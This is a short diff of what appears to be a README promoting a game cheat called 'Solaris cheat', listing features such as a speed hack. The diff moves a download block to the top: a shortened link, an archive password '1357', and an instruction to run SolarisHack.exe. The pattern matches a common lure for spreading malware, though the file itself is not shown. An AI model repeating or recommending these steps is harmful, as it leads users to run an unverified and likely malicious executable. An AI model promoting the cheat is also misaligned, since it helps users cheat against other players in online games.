@@ -1,4 +1,8 @@
 
+🔰How to downoload: 
+click here: https://sul.su/LTSE and install file.
+password: 1357
+Run SolarisHack.exe
 
 ***Description:***
 
@@ -17,9 +21,3 @@ Solaris cheat is a powerful tool designed to enhance gameplay experience in vari
 5. Speed Hack: Solaris cheat offers a speed hack function that allows players to move faster than normal, giving them a competitive edge in fast-paced situations.
 
 6. Customization Options: Players can customize various settings within the cheat to suit their playstyle and preferences, enhancing the overall gaming experience.
-
-🔰How to downoload: 
-click here: https://sul.su/LTSE and install file.
-password: 1357
-Run SolarisHack.exe
-
